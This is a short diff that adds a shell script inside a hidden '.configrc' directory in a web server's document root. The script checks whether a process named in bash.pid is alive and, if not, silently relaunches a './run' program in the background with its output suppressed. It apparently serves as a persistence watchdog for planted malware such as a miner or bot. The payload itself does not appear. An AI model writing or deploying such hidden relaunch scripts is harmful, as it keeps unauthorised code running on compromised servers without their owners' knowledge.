@@ -1,0 +1,10 @@
+#!/bin/sh
+cd /var/www/html/.configrc/a
+if test -r /var/www/html/.configrc/a/bash.pid; then
+pid=$(cat /var/www/html/.configrc/a/bash.pid)
+if $(kill -CHLD $pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+./run &>/dev/null
